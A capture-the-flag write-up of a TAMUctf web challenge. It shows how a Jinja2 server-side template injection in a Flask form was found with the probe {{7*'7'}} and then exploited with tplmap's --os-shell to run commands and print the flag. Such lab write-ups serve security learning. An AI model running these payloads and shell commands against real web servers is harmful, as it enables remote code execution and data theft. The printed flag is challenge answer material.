This was a web challenge with an estimated difficulty of "medium". Other than the difficulty, the only content in the challenge description was a link to the target web server.

Browsing to the web server reveals a page that reads "Welcome to my new FaaS! (Flask as a Service) Please enter the two chemicals you would like to combine: " and then two fields for Chemical One and Chemical Two. Using Burp Suite to intercept this POST request shows that the request and response look like this:

<code>
POST /science HTTP/1.1
Host: web3.tamuctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web3.tamuctf.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close
Upgrade-Insecure-Requests: 1

chem1=a&chem2=b


HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Mon, 04 Mar 2019 13:33:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 272
Connection: close

<html>
        <div style="text-align:center">
        <h3>The result of combining a and b is:</h3></br>
        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
        </html>
</code>


Interestingly, user-provided output is reflected in the HTTP response. Given the reference to Flask, this suggested to me the possiblity of a Server-Side Teplate Injection vulnerability. To test for this futher, I made use of <a href="https://portswigger.net/blog/server-side-template-injection">this excellent blog post </a>from Portswigger.

The blog post recommends using a couple different payloads and seeing if they're interpreted by the templating engine before being reflected to the user. One of the recommended payloads is {{7*'7'}}. I sent this data via POST request:

<code>
chem1={{7*'7'}}&chem2={{7*'7'}}
</code>

The relevant portion of the response was:

<code>
The result of combining 7777777 and 7777777 is:</br>
</code>

Clearly, my input had been interpreted. This particular response indicates that the Jinja2 templating engine is in use. Rather than try to perform further exploitation by hand, I decided to take the opportunity to experiment with the tool TPLmap, which is an automated exploitation tool for SSTI vulnerabilities, much like SQLmap for SQL injection vulnerabilities. The tool can be found here:
https://github.com/epinna/tplmap

TPLmap has a feature that, after determining an injection point, will provide a pseudo-shell to the user to allow for easy remote code execution. To exploit the SSTI I'd identified, I used this command:

<code>
python tplmap.py -u "http://web3.tamuctf.com/science" -d "chem1=1&chem2=whatever" -e jinja2 --os-shell
</code>

This provided a shell, which allowed me to view the directory contents and grab the flag:

<code>
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'chem1' is injectable
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: chem1
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux2
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux2 $ ls
config.py
entry.sh
flag.txt
requirements.txt
serve.py
tamuctf
posix-linux2 $ cat flag.txt
gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}
</code>
